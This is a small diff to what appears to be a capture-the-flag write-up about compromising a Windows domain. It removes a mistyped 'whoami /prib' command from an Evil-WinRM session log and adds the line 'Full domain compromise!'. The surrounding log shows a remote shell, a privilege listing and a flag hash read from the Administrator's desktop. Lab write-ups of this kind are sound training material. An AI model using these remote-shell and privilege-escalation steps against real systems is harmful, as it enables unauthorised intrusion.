@@ -597,10 +597,6 @@ Warning: Remote path completions is disabled due to ruby limitation: undefined m
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /prib
-whoami.exe : ERROR: Invalid argument/option - '/prib'.
-    + CategoryInfo          : NotSpecified: (ERROR: Invalid ...tion - '/prib'.:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -640,3 +636,4 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 3db96fde543982f0dc45612226ee38e3
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> 
 ```
+Full domain compromise!
